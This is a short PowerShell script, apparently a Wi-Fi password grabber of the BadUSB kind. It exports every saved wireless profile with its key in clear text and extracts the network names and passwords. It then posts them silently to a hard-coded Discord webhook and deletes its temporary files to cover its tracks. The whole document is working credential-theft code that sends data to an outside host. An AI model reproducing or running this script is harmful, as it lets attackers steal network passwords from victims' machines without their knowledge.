# Create a temporary directory and change to it
$p = "$env:temp\wifi-passwords"; md $p >$null; cd $p;

# Export all wifi profiles to xml files in the current directory
netsh wlan export profile key=clear >$null;

# Parse the xml files and create a custom object with the name and password
$r = Get-ChildItem | ForEach-Object {
  $Xml = [xml](Get-Content -Path $_.FullName)
  [PSCustomObject]@{
    Name = $Xml.WLANProfile.Name
    Password = $Xml.WLANProfile.MSM.Security.SharedKey.KeyMaterial
  }
}

# Format the custom object as a table in a Markdown code block
$body = @{content = "``````"+($r | Format-Table | Out-String)+"``````"}

# Send the formatted table to a Discord webhook
Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1467946239441109032/C_GoDzicd1fC8nULKQIyzdutX9LDDmM3brRi2Ec43mSLmUiVj_-24ELjxta05o4iyiki' -Method 'post' -Body $body >$null;

# Delete the temporary directory and exit the script
cd ..; rm $p -r -fo; exit;
